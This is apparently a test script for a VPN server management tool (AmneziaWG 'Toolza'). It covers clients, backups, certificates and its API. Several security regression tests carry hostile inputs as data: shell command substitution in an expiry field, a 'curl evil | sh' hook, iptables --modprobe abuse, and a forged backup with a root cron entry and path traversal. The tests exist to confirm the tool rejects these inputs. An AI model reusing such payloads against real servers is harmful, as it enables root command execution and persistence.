chk("срок клиента", carol.get("expires", 0) > 1e9 and carol.get("mimicry") == "none", carol)
r = api("client", "rename", "carol", "dave")
chk("api client rename", r.get("ok") and os.path.exists(os.path.join(ROOT, "root", "dave_awg2.conf")), r)
r = api("client", "del", "dave")
chk("api client del", r.get("ok") and not os.path.exists(os.path.join(ROOT, "root", "dave_awg2.conf")), r)
r = api("clients", "bulk", "t:3", "mimicry=none")
chk("api clients bulk", r.get("ok") and r["data"] == ["t-001", "t-002", "t-003"], r)
api("clients", "bulk", "z:2", "mimicry=none")
r = api("clients", "bulk", "past:2", "expire=2020-01-01", "mimicry=none")
chk("bulk: срок в прошлом отвергается", r.get("ok") is False and "прошёл" in (r.get("error") or "")
    and not any(c["name"].startswith("past-") for c in api("clients", "list").get("data") or []), r)
r = api("clients", "del", "z-001, z-002,nobody")
chk("api clients del — несколько, неизвестные пропускаются",
    r.get("ok") and r["data"] == ["z-001", "z-002"] and "Нет клиента: nobody" in r.get("log", "")
    and not os.path.exists(os.path.join(ROOT, "root", "z-001_awg2.conf"))
    and not any(c["name"].startswith("z-") for c in api("clients", "list").get("data") or []), r)
r = api("clients", "del", "nobody")
chk("api clients del — никого не нашёл: ошибка", not r.get("ok") and r.get("data") == [], r)
r = api("tunnels", "clients", "warp")
chk("клиенты туннеля без списка — все", r.get("ok") and len(r["data"]) == 5 and all(c["on"] for c in r["data"]), r)
api("tunnels", "client", "warp", "none")
r = api("tunnels", "client", "warp", "alice", "on")
rows = api("tunnels", "clients", "warp").get("data") or []
chk("выбор клиентов туннеля", [c["name"] for c in rows if c["on"]] == ["alice"], rows)
r = api("mimicry")
chk("api mimicry", r.get("ok") and len(r["data"]) == 9 and r["data"][0]["id"] == "quic" and r["data"][0]["domain"], r)
r = api("cascade", "add", "udp", "4443", "5.6.7.8", "443", "тест")
rule = next((x for x in api("cascade", "list").get("data") or [] if x["in"] == 4443), {})
chk("api cascade add/list", r.get("ok") and rule.get("out") == 443 and rule.get("proto") == "udp"
    and rule.get("comment") == "тест", [r, rule])
r = api("exits", "add", "n1", stdin="")
chk("stdin обязателен для exits add", r.get("ok") is False and "stdin" in r["error"], r)
r = api("exits", "add", "n1", stdin="[Interface]\nPrivateKey = X\n")
chk("конфиг ноды читается из stdin", r.get("ok") is False and "Endpoint" in r["error"], r)
# cascade del: аргументы шли в grep -E как регулярка — «.*» вычищал весь файл правил
r = api("cascade", "del", ".*", ".*")
rules = api("cascade", "list").get("data") or []
chk("api cascade del отвергает не порт", r.get("ok") is False and any(x["in"] == 4443 for x in rules), [r, rules])
# Новый срок заблокированному клиенту возвращает адрес, а не оставляет его на 127.0.0.2
api("client", "add", "erin", "mimicry=none")
rc, out, _ = bash('py meta-set "$SERVER_CONF" erin expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
                  'client_expire_set erin $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^erin"')
cols = out.strip().split("\t")
chk("срок заблокированному снимает блокировку", len(cols) >= 5 and cols[2].startswith("10.23.45.") and cols[4] == ""
    and cols[3].isdigit() and int(cols[3]) > 1e9, repr(out))
api("client", "del", "erin")
# Предупреждение о длине I1-I5 — по каждому клиенту отдельно, не суммой по всем
for n in ("l1", "l2"):
    with open(os.path.join(ROOT, "root", f"{n}_awg2.conf"), "w") as f:
        f.write("[Interface]\nPrivateKey = X\nI1 = " + "<b 0x" + "aa" * 1000 + ">\n")
rc, out, _ = bash("mimicry_module_warnings 2>&1")
chk("длина I1-I5: два клиента по 2 КБ — без предупреждения", "длиннее" not in out, out)
with open(os.path.join(ROOT, "root", "l3_awg2.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = X\nI1 = " + "<b 0x" + "aa" * 1850 + ">\n")
rc, out, _ = bash("mimicry_module_warnings 2>&1")
chk("длина I1-I5: один клиент на 3.7 КБ — предупреждение", "длиннее" in out, out)
for n in ("l1", "l2", "l3"):
    os.remove(os.path.join(ROOT, "root", f"{n}_awg2.conf"))
# json-rows/json-list делят только по \n: U+2028 и \r внутри значения — не новая строка
rc, out, _ = bash("printf 'n\\tx\\tc1\\xe2\\x80\\xa8c2\\r\\n' | py json-rows name ip on")
chk("json-rows: U+2028 и \\r не режут строку", json.loads(out) == [{"name": "n", "ip": "x", "on": "c1\u2028c2"}], out)
rfd, wfd = os.pipe()          # пишущий конец держим открытым до конца вызова
try:
    out = subprocess.run([API_WRAP, "version"], stdin=rfd, capture_output=True, text=True,
                         env=ENV, timeout=60).stdout
except subprocess.TimeoutExpired:
    out = "завис на чтении stdin"
os.close(rfd)
os.close(wfd)
chk("открытый stdin не блокирует команду", '"ok": true' in out, out)
r = api("frobnicate")
chk("неизвестная команда — rc 2", r.get("ok") is False and r["rc"] == 2, r)
r = api("server", "proto", "9.9")
chk("проверка аргументов", r.get("ok") is False and r["rc"] == 2 and "server proto" in r["error"], r)

# Срок клиента приходит от бота и панели — в арифметику bash не должна попасть
# подстановка команды: «expire=+0+a[$(…)]d» раньше выполняла touch.
PWNED = os.path.join(TMP, "PWNED_TS")
r = api("client", "add", "victim", f"expire=+0+a[$(touch {PWNED})]d", "mimicry=none")
chk("срок: инъекция в арифметику отбита", r.get("ok") is False and not os.path.exists(PWNED)
    and "не распознан" in (r.get("error") or ""), r)
r = api("client", "add", "victim2", "expire=$(touch /tmp/x);echo 1", "mimicry=none")
chk("срок: команда в дате отбита", r.get("ok") is False and "не распознан" in (r.get("error") or ""), r)
rows = api("clients", "list").get("data") or []
chk("клиент с инъекцией в сроке не создан", not any(c["name"] in ("victim", "victim2") for c in rows), rows)
r = api("client", "add", "okdate", "expire=+30d", "mimicry=none")
chk("валидный срок +30d работает", r.get("ok"), r)
r = api("client", "add", "okabs", "expire=2027-01-01", "mimicry=none")
chk("валидная дата работает", r.get("ok"), r)

# Параметры вручную: проверка, запрет без force, применение, откат
ALICE = os.path.join(ROOT, "root", "alice_awg2.conf")
r = api("server", "params")
d = r.get("data") or {}
chk("api server params — текущие значения", r.get("ok") and d.get("proto") == "2.0" and d["values"]["Jc"] == "5"
    and d["values"]["H1"] == "100-2000" and list(d["values"])[:3] == ["Jc", "Jmin", "Jmax"]
    and d["errors"] == [] and d["changed"] == [] and "ContentPaddingAddition" not in d["values"], r)
r = api("server", "params", "check", "Jc=7", "S2=96", "HeaderProtectionKey=x")
d = r.get("data") or {}
chk("params check: ошибки, изменённые, обязательные для клиентов", r.get("ok") and d["values"]["Jc"] == "7"
    and any("S1 и S2" in e for e in d["errors"]) and any("перегенерацией" in e for e in d["errors"])
    and d["changed"] == ["Jc", "S2"] and d["breaking"] == ["S2"], d)
r = api("server", "params", "set", "S2=96")
chk("params set с ошибкой не пишет конфиг", not r.get("ok") and "S1 и S2" in r["error"]
    and kv(open(conf).read()).get("S2") == "60", r)
r = api("server", "params", "set", "Jc=20")
chk("предупреждение без force — отказ", not r.get("ok") and "force" in r["error"] and "рекомендуется 3-12" in r["log"]
    and kv(open(conf).read()).get("Jc") == "5", r)
reset_calls()
r = api("server", "params", "set", "force", "Jc=20", "Jmax=100")
d = r.get("data") or {}
chk("params set force: сервер, клиенты, рестарт", r.get("ok") and d.get("changed") == ["Jc", "Jmax"]
    and d.get("breaking") == [] and d.get("clients", 0) >= 2 and kv(open(conf).read()).get("Jc") == "20"
    and kv(open(ALICE).read()).get("Jmax") == "100" and kv(open(ALICE).read()).get("S1") == "40"
    and "awg-quick up" in calls() and "продолжают работать" in r.get("log", ""), [r, calls()])
BK = os.path.join(ROOT, "awg_backup")
chk("правка оставляет авто-бэкап", os.path.isdir(BK) and any(n.startswith("auto_params_") for n in os.listdir(BK)),
    os.listdir(BK) if os.path.isdir(BK) else "нет каталога")
r = api("server", "params", "set", "H1=10000-20000")
chk("смена H — клиентам нужны новые конфиги", r.get("ok") and r["data"]["breaking"] == ["H1"]
    and "обязаны совпадать" in r.get("log", "") and kv(open(ALICE).read()).get("H1") == "10000-20000", r)
r = api("server", "params", "set", "Jc=20")
chk("без изменений — без рестарта", r.get("ok") and "не изменились" in r.get("log", ""), r)
FAILBIN = os.path.join(TMP, "failbin")
os.makedirs(FAILBIN, exist_ok=True)
with open(os.path.join(FAILBIN, "awg-quick"), "w") as f:
    f.write('#!/usr/bin/env bash\n[[ "$1" == up ]] && { echo "Unable to modify interface: Invalid argument" >&2; exit 1; }\nexit 0\n')
os.chmod(os.path.join(FAILBIN, "awg-quick"), 0o755)
r = api("server", "params", "set", "S1=45", env={"PATH": FAILBIN + ":" + ENV["PATH"]})
chk("awg0 не поднялся — откат сервера и клиентов", not r.get("ok") and kv(open(conf).read()).get("S1") == "40"
    and kv(open(ALICE).read()).get("S1") == "40" and "возвращаю прежние" in r.get("log", ""), r)
rc, out, _ = bash('printf "S1 = 86\\nS2 = 48\\nS3 = 16\\nS4 = 12\\nH1 = 1\\nH2 = 2\\nH3 = 3\\nH4 = 4\\nJc = 4\\nJmin = 10\\nJmax = 50\\n'
                  'HeaderProtectionKey = K=\\nRekeyAfterTime = 115-150\\nRejectAfterTime = 180-210\\nRandomTrailers = on\\nDisableCookies = on\\n" '
                  '| py params-check 3.1 1280 S3=8 RejectAfterTime=140-200 DisableCookies=off')
chk("3.1: S ≥ 12, RejectAfterTime > RekeyAfterTime, off убирает ключ",
    "E\tS3 = 8" in out and "RejectAfterTime должен" in out and "K\tDisableCookies\toff" in out
    and "P\tDisableCookies" not in out and "P\tRandomTrailers = on" in out and "B\tS3" in out, out)

# Перезапуск бота по просьбе самого бота — отложенный: awg2 живёт в cgroup
# бота и обязан успеть ответить до того, как systemd его остановит
with open(ACTIVE, "a") as f:
    f.write("awg-bot.service\n")
reset_calls()
t0 = time.time()
r = api("bot", "restart")
quick_log = calls()
chk("api bot restart отвечает сразу, до перезапуска", r.get("ok") and time.time() - t0 < 2
    and "systemctl restart awg-bot.service" not in quick_log, [r.get("error"), quick_log[-200:]])
time.sleep(3)
chk("бот перезапускается через пару секунд", "systemctl restart awg-bot.service" in calls(), calls()[-300:])
open(ACTIVE, "w").close()

# Очередь: пока занят замок, изменяющая команда отказывает, чтение — нет
lock = os.path.join(ROOT, "var/lib/awg2/api.lock")
holder = subprocess.Popen(["flock", lock, "sleep", "8"])
time.sleep(0.5)
r = api("client", "del", "t-001", env={"API_LOCK_WAIT": "1"})
chk("занятая очередь — rc 75", r.get("ok") is False and r["rc"] == 75 and "другая операция" in r["error"], r)
r = api("clients", "list")
chk("чтение мимо очереди", r.get("ok") is True, r)
holder.kill()
holder.wait()

# Фоновая задача: старт, опрос журнала по смещению, итог
r = api("job", "start", "diag", "dpi-hint")
jid = (r.get("data") or {}).get("id", "")
chk("api job start", r.get("ok") and re.match(r"^\d{8}-\d{6}-[0-9a-f]{4}$", jid), r)
st, log, off = {}, "", 0
for _ in range(60):
    st = api("job", "status", jid, str(off)).get("data") or {}
    log += st.get("log", "")
    off = st.get("offset", off)
    if st.get("state") != "running":
        break
    time.sleep(0.5)
chk("задача завершилась", st.get("state") == "done" and st.get("ok") is True and st.get("rc") == 0, st)
chk("журнал задачи без цвета", "dpi-detector" in log and "\x1b[" not in log, log[:200])
r = api("job", "list")
chk("api job list", r.get("ok") and r["data"] and r["data"][0]["id"] == jid and r["data"][0]["state"] == "done", r)
r = api("job", "start", "bogus")
jid = (r.get("data") or {}).get("id", "")
for _ in range(60):
    st = api("job", "status", jid).get("data") or {}
    if st.get("state") != "running":
        break
    time.sleep(0.5)
chk("ошибка задачи в итоге", st.get("state") == "done" and st.get("ok") is False and st.get("rc") == 2, st)

print("Бэкап")
r = api("backup", "create")
bk_path = (r.get("data") or {}).get("path") or ""
chk("бэкап — в каталоге песочницы, не в настоящем ~/awg_backup",
    r.get("ok") and bk_path.startswith(os.path.join(ROOT, "awg_backup")), r)
r = api("backup", "list")
chk("архив бэкапа в списке", bk_path in [b["path"] for b in r.get("data") or []], r)
r = api("backup", "inspect", bk_path)
chk("inspect: клиенты и метаданные", r.get("ok") and r["data"]["clients"] >= 2 and "timestamp=" in r["data"]["meta"], r)
junk = os.path.join(TMP, "junk.tar.gz")
with open(junk, "wb") as f:
    f.write(b"not a tar")
r = api("backup", "inspect", junk)
chk("не архив — понятная ошибка без трассировки Python",
    r.get("ok") is False and "это не архив" in r.get("log", "") and "Traceback" not in r.get("log", ""), r)
# Клиент, созданный после бэкапа, — сирота после восстановления: его конфиг убирается;
# конфиги клиентов, которые в awg0 бэкапа есть, остаются на месте
api("client", "add", "late", "mimicry=none")
LATE = os.path.join(ROOT, "root", "late_awg2.conf")
r = api("backup", "restore", bk_path)
chk("восстановление из архива", r.get("ok") and "Восстановлено" in r.get("log", ""), r)
chk("restore: конфиг клиента не из бэкапа убран, остальные на месте",
    not os.path.exists(LATE) and os.path.exists(ALICE)
    and not any(c["name"] == "late" for c in api("clients", "list").get("data") or []), os.listdir(os.path.join(ROOT, "root")))

# Хуки awg-quick выполняются от root. Свои команды Тулзы (1.x и 0.8) проходят,
# чужие и iptables --modprobe (запускает любую программу) — нет.
HOOKS = os.path.join(TMP, "hooks.conf")
rc, out, _ = bash(f'{{ echo "[Interface]"; _postup_lines 10.8.0.0/24 eth0; '
                  'echo "PostUp = ip link set dev awg0 mtu 1320; echo 1 > /proc/sys/net/ipv4/ip_forward; '
                  'iptables -t nat -C POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE >/dev/null 2>&1 || '
                  'iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE"; '
                  f'}} > "{HOOKS}"; py conf-hooks "{HOOKS}" check')
chk("хуки Тулзы (1.x и 0.8) — допустимы", rc == 0 and out == "", out)
with open(HOOKS, "w") as f:
    f.write("[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; touch /tmp/x; "
            "iptables -C X 2>/dev/null || curl evil | sh\nPreUp = iptables --modp=/tmp/x -L\n"
            "PreDown = ip6tables -M /tmp/x -L\nPostDown = iptables -L $(id)\nSaveConfig = true\n"
            "\n[Peer]\nPublicKey = P\n")
rc, out, _ = bash(f'py conf-hooks "{HOOKS}" fix')
bad = out.splitlines()
chk("недопустимые команды названы: чужие, --modprobe, подстановка, SaveConfig",
    rc == 0 and "PostUp\ttouch /tmp/x" in bad and "PostUp\tiptables -C X 2>/dev/null || curl evil | sh" in bad
    and "PreUp\tiptables --modp=/tmp/x -L" in bad and "PreDown\tip6tables -M /tmp/x -L" in bad
    and "PostDown\tiptables -L $(id)" in bad and "SaveConfig\tSaveConfig = true" in bad and len(bad) == 6, out)
with open(HOOKS) as f:
    fixed = f.read()
chk("в файле — только допустимое, [Peer] не тронут",
    fixed == "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT\n\n[Peer]\nPublicKey = P\n", fixed)
WGC = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
os.makedirs(os.path.dirname(WGC), exist_ok=True)
with open(WGC, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nPostUp = touch /tmp/x\npostdown = /old/fw.sh down\nListenPort = 1\n")
rc, out, _ = bash('_wgobf_hooks_reset 2>&1; echo "==="; cat "$WGOBF_WG_CONF"; echo "FW=$WGOBF_FW"')
said, rest = out.split("===", 1)
conf_text, fw = rest.rsplit("FW=", 1)
fw = fw.strip()
chk("wgobf0 из бэкапа: хуки — ровно скрипт Тулзы, о чужих — предупреждение",
    conf_text.strip() == f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1"
    and "чужие команды" in said and "touch /tmp/x" in said and "/old/fw.sh down" in said, out)

# Подделанный бэкап: в awg0.conf — команды не из Тулзы, в архиве туннелей —
# файл вне путей Тулзы, exit-нода с хуком, мусор в каскаде и tun2socks,
# чужой toml dnscrypt-proxy; в каталоге WARP — «скрипт автозапуска».
# Прежде tunnels.tar.gz распаковывался прямо в / как есть.
import io
import shutil
import tarfile
EVIL = os.path.join(TMP, "evil")
shutil.rmtree(EVIL, ignore_errors=True)
with tarfile.open(bk_path) as t:
    t.extractall(EVIL)
top = os.path.join(EVIL, os.listdir(EVIL)[0])
with open(os.path.join(top, "awg0.conf")) as f:
    srv = f.read()
srv = srv.replace("[Interface]\n", "[Interface]\nPostUp = iptables -A INPUT -p tcp --dport 2222 -j ACCEPT; "
                  f"touch {TMP}/pwned\nSaveConfig = true\n", 1)
with open(os.path.join(top, "awg0.conf"), "w") as f:
    f.write(srv)
os.makedirs(os.path.join(top, "warp/wgcf"), exist_ok=True)
for name, body in (("warp-autostart.sh", f"#!/bin/sh\ntouch {TMP}/pwned\n"), ("wgcf-account.toml", "acct\n")):
    with open(os.path.join(top, "warp/wgcf", name), "w") as f:
        f.write(body)
AWGD = os.path.join(ROOT, "etc/amnezia/amneziawg")
members = {
    os.path.join(ROOT, "etc/cron.d/evil"): "* * * * * root touch /tmp/pwned\n",
    os.path.join(AWGD, "awg-exit-n2.conf"): "[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\n"
                                            f"PostUp = touch {TMP}/pwned\n\n[Peer]\nPublicKey = P\n"
                                            "Endpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n",
    os.path.join(AWGD, "awg-exit-../x.conf"): "[Interface]\n",
    os.path.join(ROOT, "etc/awg-cascade/rules.conf"): "udp|4443|5.6.7.8|443|ok\nudp|1;id|5.6.7.8|443|bad\n",
    os.path.join(ROOT, "etc/tun2socks/proxy.txt"): "127.0.0.1:1080;touch x\n",
    os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml"):
        "server_names = ['quad9-doh-ip4-port443-nofilter-pri']\n[query_log]\n  file = '/etc/cron.d/x'\n",
}
with tarfile.open(os.path.join(top, "tunnels.tar.gz"), "w:gz") as t:
    for path, body in members.items():
        data = body.encode()
        ti = tarfile.TarInfo(path.lstrip("/"))
        ti.size = len(data)
        t.addfile(ti, io.BytesIO(data))
EVIL_TGZ = os.path.join(TMP, "evil_backup.tar.gz")
with tarfile.open(EVIL_TGZ, "w:gz") as t:
    t.add(top, arcname=os.path.basename(top))
r = api("backup", "restore", EVIL_TGZ, "tunnels")
log = r.get("log", "")
with open(os.path.join(AWGD, "awg0.conf")) as f:
    srv = f.read()
chk("restore чужого бэкапа: из awg0.conf убраны команды не из Тулзы, о них — в итоге",
    r.get("ok") and "Команды убраны" in log and "pwned" in log and "--dport 2222" in srv
    and "pwned" not in srv and "SaveConfig" not in srv, [log[-600:], srv[:300]])
chk("архив туннелей не распаковывается в /: файл вне путей Тулзы не появился",
    not os.path.exists(os.path.join(ROOT, "etc/cron.d/evil")) and not os.path.exists("/etc/cron.d/evil"))
EXIT2 = os.path.join(AWGD, "awg-exit-n2.conf")
with open(EXIT2) as f:
    ex2 = f.read()
chk("exit-нода из бэкапа — без хуков, с Table = off", "PostUp" not in ex2 and "Table = off" in ex2
    and not os.path.exists(os.path.join(AWGD, "x.conf")), ex2)
with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf")) as f:
    rules = f.read()
chk("каскад из бэкапа — только строки по формату", rules == "udp|4443|5.6.7.8|443|ok\n", rules)
chk("адрес tun2socks не по формату не восстановлен", not os.path.exists(os.path.join(ROOT, "etc/tun2socks/proxy.txt")))
with open(os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml")) as f:
    toml = f.read()
chk("dnscrypt-proxy — шаблон Тулзы, из бэкапа только резолверы",
    "AWG Toolza" in toml and "server_names = ['quad9-doh-ip4-port443-nofilter-pri']" in toml
    and "query_log" not in toml and "cron" not in toml, toml)
chk("WARP: данные аккаунта — да, скрипт автозапуска из бэкапа — нет",
    os.path.exists(os.path.join(ROOT, "etc/wgcf/wgcf-account.toml"))
    and not os.path.exists(os.path.join(ROOT, "etc/wgcf/warp-autostart.sh")))
chk("ничего из бэкапа не выполнилось", not os.path.exists(os.path.join(TMP, "pwned")))

print("Сертификат")
fake_acme()
CERT = os.path.join(ROOT, "etc/awg2/cert/fullchain.pem")
r = api("cert")
chk("cert status: сертификата нет, IP сервера известен",
    r.get("ok") and r["data"]["installed"] is False and r["data"]["ip"] == "203.0.113.10", r)
reset_calls()
r = api("cert", "issue", "ip")
c = calls()
chk("сертификат на IP: Let's Encrypt, http-01 на 80-м порту, профиль shortlived, продление через 3 дня",
    r.get("ok") and "--issue --server letsencrypt -d 203.0.113.10 --standalone --httpport 80" in c
    and "--cert-profile shortlived --days 3" in c, [r.get("log"), c[-500:]])
st = api("cert", "status").get("data") or {}
chk("сертификат на месте, срок читается",
    st.get("installed") and st.get("kind") == "ip" and st.get("name") == "203.0.113.10"
    and (st.get("expires") or 0) > time.time() + 5 * 86400 and oct(os.stat(CERT.replace("fullchain", "key")).st_mode)[-3:] == "600", st)
with open(os.path.join(ROOT, "units", "awg2-cert.service")) as f:
    unit = f.read()
chk("таймер продления: acme.sh --cron со своим каталогом",
    "--cron --home" in unit and os.path.exists(os.path.join(ROOT, "units", "awg2-cert.timer")), unit)
r = api("cert", "issue", "ip")
chk("повторный выпуск: acme.sh ответил «рано продлевать» — не ошибка", r.get("ok"), r)
r = api("cert", "issue", "domain", "bad_domain")
chk("домен проверяется", not r.get("ok") and "домен" in (r.get("error") or ""), r)
r = api("cert", "issue", "domain", "nothing.invalid")
chk("домен без A-записи — понятная ошибка", not r.get("ok") and "не резолвится" in (r.get("error") or ""), r)

with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11\n')
r = api("bot", "webapp", "get")
chk("Mini App: порт по умолчанию 8443, адрес по сертификату",
    r.get("ok") and r["data"] == {"port": "8443", "url": "https://203.0.113.10:8443/"}, r)
r = api("bot", "webapp", "port", "80")
chk("порт 80 под Mini App не отдаётся — он для сертификата", not r.get("ok"), r)
r = api("bot", "webapp", "port", "443")
chk("порт 443 — адрес без номера порта",
    r.get("ok") and api("bot", "webapp", "get")["data"]["url"] == "https://203.0.113.10/", r)
with open(os.path.join(ROOT, "bot.conf")) as f:
    chk("порт записан в конфиг бота, токен не тронут", "WEBAPP_PORT=443" in f.read())
os.remove(os.path.join(ROOT, "bot.conf"))

reset_calls()
r = api("cert", "remove")
chk("удаление: acme.sh забывает адрес, файлы и таймер убраны",
    r.get("ok") and not os.path.exists(CERT) and "--remove -d 203.0.113.10" in calls()
    and not os.path.exists(os.path.join(ROOT, "var/lib/awg2/cert")), [r, calls()[-300:]])

# Готовый сертификат сервера (порт 80 занят Caddy): тестовый CA и сертификат
# на IP сервера в каталоге Caddy, рядом — самоподписанный и с чужим ключом
print("Готовые сертификаты")
CA = os.path.join(TMP, "ca")
CADDY = os.path.join(ROOT, "var/lib/caddy/.local/share/caddy/certificates/acme/203.0.113.10")
SELF = os.path.join(ROOT, "etc/letsencrypt/live/self")
BADK = os.path.join(ROOT, "root/cert/bad")
for d in (CA, CADDY, SELF, BADK):
    os.makedirs(d, exist_ok=True)
EC = ["-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:P-256", "-nodes"]
def ossl(*a):
    subprocess.run(["openssl", *a], check=True, capture_output=True, cwd=CA)
ossl("req", "-x509", *EC, "-keyout", "ca.key", "-out", "ca.crt", "-days", "30", "-subj", "/CN=Test CA")
ossl("req", *EC, "-keyout", f"{CADDY}/203.0.113.10.key", "-out", "leaf.csr", "-subj", "/CN=203.0.113.10")
with open(os.path.join(CA, "ext"), "w") as f:
    f.write("subjectAltName=IP:203.0.113.10\n")
ossl("x509", "-req", "-in", "leaf.csr", "-CA", "ca.crt", "-CAkey", "ca.key", "-CAcreateserial",
     "-out", f"{CADDY}/203.0.113.10.crt", "-days", "20", "-extfile", "ext")
ossl("req", "-x509", *EC, "-keyout", f"{SELF}/privkey.pem", "-out", f"{SELF}/fullchain.pem", "-days", "20",
     "-subj", "/CN=203.0.113.10", "-addext", "subjectAltName=IP:203.0.113.10")
shutil.copy(f"{CADDY}/203.0.113.10.crt", f"{BADK}/fullchain.pem")
ossl("genpkey", "-algorithm", "EC", "-pkeyopt", "ec_paramgen_curve:P-256", "-out", f"{BADK}/privkey.pem")
CADDY_CRT = f"{CADDY}/203.0.113.10.crt"
r = api("cert", "find")
rows = r.get("data") or []
chk("находит сертификат Caddy, самоподписанный и с чужим ключом — мимо",
    r.get("ok") and [(x["name"], x["source"], x["cert"]) for x in rows] == [("203.0.113.10", "Caddy", CADDY_CRT)], r)
r = api("cert", "use", "/etc/passwd")
chk("подключается только найденный, не любой путь", not r.get("ok") and "нет" in (r.get("error") or ""), r)
r = api("cert", "use", CADDY_CRT)
st = api("cert", "status").get("data") or {}
chk("готовый подключён ссылкой, продлевает Caddy", r.get("ok") and os.path.islink(CERT)
    and os.path.realpath(CERT) == os.path.realpath(CADDY_CRT) and st.get("kind") == "external"
    and st.get("source") == "Caddy" and st.get("installed") and st.get("name") == "203.0.113.10"
    and not os.path.exists(os.path.join(ROOT, "units", "awg2-cert.timer.disabled")), [r, st])
r = api("cert", "remove")
chk("удаление готового: свои ссылки убраны, файлы Caddy целы", r.get("ok") and not os.path.lexists(CERT)
    and os.path.exists(CADDY_CRT) and os.path.exists(f"{CADDY}/203.0.113.10.key"), r)

BUSY = os.path.join(TMP, "busy80")
os.makedirs(BUSY, exist_ok=True)
with open(os.path.join(BUSY, "ss"), "w") as f:
    f.write('#!/usr/bin/env bash\n[[ "$*" == *":80"* ]] && echo \'LISTEN 0 4096 *:80 *:* users:(("caddy",pid=1,fd=3))\'\nexit 0\n')
os.chmod(os.path.join(BUSY, "ss"), 0o755)
r = api("cert", "issue", "ip", env={"PATH": BUSY + ":" + ENV["PATH"]})
chk("порт 80 занят — отказ с подсказкой про готовый сертификат", not r.get("ok") and "занят (caddy)" in (r.get("error") or "")
    and "готовые сертификаты (1)" in r.get("log", ""), r)
st = api("cert", "status", env={"PATH": BUSY + ":" + ENV["PATH"]}).get("data") or {}
chk("статус: кто держит порт 80 и сколько готовых", st.get("port80") == "caddy" and st.get("found") == 1, st)

print("Список изменений")
MD = ("# Изменения\n\n---\n\n## v1.2.0 — 2026-11-01\n\n- новое **важное**\n  продолжение\n\n---\n\n"
      "## v1.1.1 — 2026-10-01\n\n- исправление\n\n---\n\n## v1.1.0 — 2026-10-01 (бот 3.1.0)\n\n- панель\n")
rc, out, _ = bash("py changelog-json v1.1.0", stdin=MD)
d = json.loads(out) if rc == 0 else {}
chk("изменения новее установленной, сверху новейшая", d.get("newer") is True
    and [x["version"] for x in d.get("sections", [])] == ["v1.2.0", "v1.1.1"]
    and d["sections"][0]["title"] == "2026-11-01" and d["sections"][0]["body"].endswith("продолжение"), d)
rc, out, _ = bash("py changelog-json v1.2.0", stdin=MD)
d = json.loads(out) if rc == 0 else {}
chk("новее нет — раздел текущей версии", d.get("newer") is False
    and [x["version"] for x in d.get("sections", [])] == ["v1.2.0"], d)
r = api("update", "changelog")
chk("нет связи с GitHub — понятная ошибка", not r.get("ok") and "недоступен" in (r.get("error") or ""), r)

print("Мимикрия как у сервера")
with open(conf, "w") as f:
    f.write(OLD20.replace("# AWG_MIMICRY=quic", "# AWG_MIMICRY=dns\n# AWG_MIMICRY_DOMAIN=example.com\n# AWG_OBF_LEVEL=2"))
def i_lines(name):
    t = (api("client", "conf", name).get("data") or {}).get("text", "")
    return sorted(set(re.findall(r"^(I[1-5]) =", t, re.M)))
api("client", "add", "m_srv", "mimicry=server")
api("client", "add", "m_srv3", "mimicry=server:3")
chk("«как у сервера» — уровень сервера (только I1)", i_lines("m_srv") == ["I1"], i_lines("m_srv"))
chk("«как у сервера» с уровнем 3 — цепочка того же профиля", i_lines("m_srv3") == ["I1", "I2", "I3", "I4", "I5"],
    i_lines("m_srv3"))

summary()
